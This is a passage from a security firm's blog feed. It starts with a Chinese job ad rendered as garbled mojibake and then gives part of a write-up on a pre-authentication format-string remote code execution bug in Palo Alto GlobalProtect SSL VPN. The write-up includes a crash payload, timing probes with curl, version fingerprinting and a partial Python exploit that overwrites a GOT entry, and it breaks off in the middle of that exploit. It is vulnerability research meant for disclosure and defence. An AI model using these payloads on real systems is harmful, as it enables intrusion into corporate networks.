  &lt;li&gt;æ‡‚å¾—æºé€šå‚¾è½ï¼Œèƒ½åŒç†ä»–äººï¼Œæ‰¾å‡ºå½¼æ­¤å…±è­˜ã€‚&lt;/li&gt;
  &lt;li&gt;æ“…é•·é‚è¼¯æ€è€ƒï¼Œæ‡‚å¾—é€éæ·ºé¡¯æ˜“æ‡‚ä¸”æ¢ç†æ¸…æ™°çš„æ–¹å¼å‚³é”è‡ªå·±çš„æƒ³æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;è‰¯å¥½çš„æ™‚é–“ç®¡ç†èƒ½åŠ›ï¼Œä¾æ“šä»»å‹™çš„å„ªå…ˆé †åºï¼Œæœ‰æ•ˆç‡çš„å®Œæˆæ¯é …äº¤è¾¦ã€‚&lt;/li&gt;
  &lt;li&gt;å‹‡æ–¼æ¥å—æŒ‘æˆ°ä¸”å…·å‚™è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼ŒåŠªåŠ›å…‹æœæœªçŸ¥çš„é›£é¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ¢ä»¶è¦æ±‚&quot;&gt;å·¥ä½œæ¢ä»¶è¦æ±‚&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;éœ€æœ‰ä¸‰å¹´ä»¥ä¸Šè¡Œæ”¿ç›¸é—œå·¥ä½œç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Google Sheets æ“ä½œï¼Œä¸”å…·ç¨ç«‹æ’°å¯«è©¦ç®—è¡¨å…¬å¼çš„èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;ç¿’æ…£ä½¿ç”¨é›²ç«¯æœå‹™ï¼Œå¦‚ï¼šGoogle Drive, Dropbox æˆ–å…¶ä»–&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨ä½¿ç”¨éå°ˆæ¡ˆç®¡ç†ç³»çµ±ï¼Œå¦‚ï¼šTrello, Basecamp, Redmine æˆ–å…¶ä»–&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨å°‡æœƒä½¿ç”¨å°ˆæ¡ˆç®¡ç†ç³»çµ±ç®¡ç†å¹³æ—¥ä»»å‹™ã€‚&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ MAC ä½¿ç”¨è€…&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨æœªä¾†çš„é›»è…¦æœƒæ˜¯ MACï¼Œæˆ‘å€‘å¸Œæœ›æ‚¨è¶Šå¿«é †æš¢ä½¿ç”¨é›»è…¦è¶Šå¥½ã€‚&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ç”Ÿæ´»é§­å®¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨ä¸éœ€è¦æœƒå¯«ç¨‹å¼ï¼Œä½†æ‚¨ç¿’æ…£è§€å¯Ÿç”Ÿæ´»ä¸­çš„è¦å¾‹ï¼Œä¸¦æƒ³è¾¦æ³•åˆ©ç”¨é€™äº›è¦å¾‹æœ‰æ•ˆç‡çš„è§£æ±ºå•é¡Œã€‚&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œç’°å¢ƒ&quot;&gt;å·¥ä½œç’°å¢ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨æœƒåœ¨ä¸€å€‹é–‹é—Šçš„è¾¦å…¬ç’°å¢ƒå·¥ä½œ&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æœƒæ“æœ‰ä¸€å¼µ Aeron äººé«”å·¥å­¸æ¤…&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ¯é€±è£œæ»¿é£²æ–™ï¼ˆå¦æœ‰å’–å•¡æ©Ÿï¼‰ã€é›¶é£Ÿï¼Œè®“æ‚¨ä¿æŒå¿ƒæƒ…æ„‰å¿«&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;å…¬å¸æä¾›é£›é¢æ©Ÿè®“æ‚¨ç™¼æ´©å°ä¸»ç®¡çš„æ€¨æ°£&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸ç¦åˆ©&quot;&gt;å…¬å¸ç¦åˆ©&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘æ³¨é‡å…¬å¸æ¯ä½åŒä»çš„èº«å¿ƒå¥åº·ï¼Œè«‹åƒè€ƒä»¥ä¸‹ç¦åˆ©åˆ¶åº¦ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä¼‘å‡ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;åˆ°è·å³å¯é æ”¯ç•¶å¹´åº¦ç‰¹ä¼‘&lt;/li&gt;
      &lt;li&gt;æ¯å¹´äº”å¤©å…¨è–ªç—…å‡&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;çé‡‘ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;ä¸‰ç¯€ç¦®é‡‘ï¼ˆæ˜¥ç¯€ã€ç«¯åˆç¯€ã€ä¸­ç§‹ç¯€ï¼‰&lt;/li&gt;
      &lt;li&gt;ç”Ÿæ—¥ç¦®é‡‘&lt;/li&gt;
      &lt;li&gt;å©šå–ªè£œåŠ©&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¼‘é–’ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥æ—…éŠ&lt;/li&gt;
      &lt;li&gt;èˆ’å£“æŒ‰æ‘©&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¾é£Ÿç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;é›¶é£Ÿé£²æ–™&lt;/li&gt;
      &lt;li&gt;å“¡å·¥èšé¤&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å¥åº·ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥å¥åº·æª¢æŸ¥&lt;/li&gt;
      &lt;li&gt;é‹å‹•ä¸­å¿ƒå¥èº«åˆ¸&lt;/li&gt;
      &lt;li&gt;åœ˜é«”ä¿éšª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é€²ä¿®ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å…§éƒ¨æ•™è‚²è¨“ç·´&lt;/li&gt;
      &lt;li&gt;å¤–éƒ¨é€²ä¿®èª²ç¨‹&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…¶ä»–
    &lt;ul&gt;
      &lt;li&gt;å°ˆæ¥­çš„å…¬å¸åœ˜éšŠ&lt;/li&gt;
      &lt;li&gt;æ‰å¹³çš„å…§éƒ¨çµ„ç¹”&lt;/li&gt;
      &lt;li&gt;é †æš¢çš„æºé€šæ°›åœ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;èµ·è–ªç¯„åœ&quot;&gt;èµ·è–ªç¯„åœ&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 34,000 - 40,000 ï¼ˆä¿è­‰å¹´è–ª 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ‡‰å¾µæ–¹å¼&quot;&gt;æ‡‰å¾µæ–¹å¼&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„å±¥æ­·ä»¥ PDF æ ¼å¼å¯„åˆ°Â recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.docx&quot;&gt;DOC&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚â€¨è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¨™é¡Œæ ¼å¼ï¼š&lt;strong&gt;[æ‡‰å¾µ] è¡Œæ”¿å°ˆå“¡ æ‚¨çš„å§“å&lt;/strong&gt;ï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] è¡Œæ”¿å°ˆå“¡ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å·¥ä½œç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘æœƒåœ¨å…©é€±å…§ä¸»å‹•èˆ‡æ‚¨è¯ç¹«ï¼Œæ‹›å‹Ÿéç¨‹ä¾åºç‚ºæ›¸é¢å¯©æ ¸ã€ç·šä¸Šæ¸¬é©—ä»¥åŠé¢è©¦ä¸‰å€‹éšæ®µã€‚æœ€å¿«å°‡æ–¼å…«æœˆä¸­é€²è¡Œç¬¬äºŒéšæ®µçš„ç·šä¸Šæ¸¬é©—ï¼Œç…©è«‹è€å¿ƒç­‰å€™ã€‚&lt;br /&gt;
ç”±æ–¼æœ€è¿‘æ¥­å‹™è¼ƒç‚ºå¿™ç¢Œï¼Œè‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œé€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é¸æ“‡å„ªå…ˆåœ¨éƒ¨è½æ ¼å…¬å¸ƒå¾µæ‰è³‡è¨Šï¼Œæ˜¯å¸Œæœ›æ‚¨ä¹Ÿå°è³‡è¨Šå®‰å…¨è­°é¡Œæ„Ÿèˆˆè¶£ï¼Œå³ä½¿ä¸æ‡‚æŠ€è¡“ä¹Ÿæƒ³ç‚ºå°ç£è³‡å®‰ç›¡ä¸€é»åŠ›ã€‚ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘éƒ½æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼ŒæœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/07/23/devcore-201907-recruit/</link>
                <guid>https://devco.re/blog/2019/07/23/devcore-201907-recruit</guid>
                <pubDate>Tue, 23 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? Theyâ€™re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;

&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Donâ€™t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;

&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;

&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;

&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;

&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;

&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;

&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
        &amp;lt;clientcert-response&amp;gt;
                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
        &amp;lt;/clientcert-response&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;

scep-profile-name=%n%n%n%n%n...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;

&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;

&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we canâ€™t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;

&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%9999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%99999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%999999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, itâ€™s still improper to crash a service!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;

&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%70&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%32&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
